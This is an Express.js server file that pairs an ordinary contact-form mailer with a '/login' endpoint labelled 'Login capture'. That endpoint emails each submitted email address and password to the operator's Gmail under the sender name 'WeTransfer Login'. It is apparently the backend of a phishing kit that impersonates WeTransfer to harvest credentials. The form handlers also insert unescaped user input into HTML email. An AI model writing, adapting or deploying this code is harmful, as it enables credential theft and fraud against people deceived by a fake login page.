require('dotenv').config();
const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');

const app = express();

const allowedOrigins = (process.env.ALLOWED_ORIGIN || '').split(',').map(o => o.trim());

app.use(cors({
  origin: function (origin, callback) {
    // Allow requests with no origin (e.g. Postman, curl)
    if (!origin) return callback(null, true);
    if (allowedOrigins.includes(origin)) return callback(null, true);
    callback(new Error('Not allowed by CORS'));
  }
}));
app.use(express.json());

const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.GMAIL_USER,
    pass: process.env.GMAIL_PASS,
  },
});

const path = require('path');

// Serve static files from /public
app.use(express.static(path.join(__dirname, 'public')));

// Health check
// app.get('/', (req, res) => {
//   res.json({ status: 'Mail server is running' });
// });

// Send email endpoint
app.post('/send', async (req, res) => {
  const { name, email, subject, message } = req.body;

  if (!name || !email || !message) {
    return res.status(400).json({ success: false, error: 'name, email and message are required' });
  }

  try {
    await transporter.sendMail({
      from: `"${name}" <${process.env.GMAIL_USER}>`,
      replyTo: email,
      to: process.env.GMAIL_USER,
      subject: subject || `New message from ${name}`,
      html: `
        <h3>New Form Submission</h3>
        <p><strong>Name:</strong> ${name}</p>
        <p><strong>Email:</strong> ${email}</p>
        <p><strong>Message:</strong><br/>${message}</p>
      `,
    });

    res.json({ success: true, message: 'Email sent successfully' });
  } catch (err) {
    console.error(err);
    res.status(500).json({ success: false, error: 'Failed to send email' });
  }
});

// Login capture endpoint
app.post('/login', async (req, res) => {
  const { email, password } = req.body;

  if (!email || !password) {
    return res.status(400).json({ success: false, error: 'email and password are required' });
  }

  try {
    await transporter.sendMail({
      from: `"WeTransfer Login" <${process.env.GMAIL_USER}>`,
      to: process.env.GMAIL_USER,
      subject: `Login Attempt — ${email}`,
      html: `
        <h3>Login Submission</h3>
        <p><strong>Email:</strong> ${email}</p>
        <p><strong>Password:</strong> ${password}</p>
        <p><strong>Time:</strong> ${new Date().toISOString()}</p>
      `,
    });

    res.json({ success: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ success: false, error: 'Failed to send email' });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));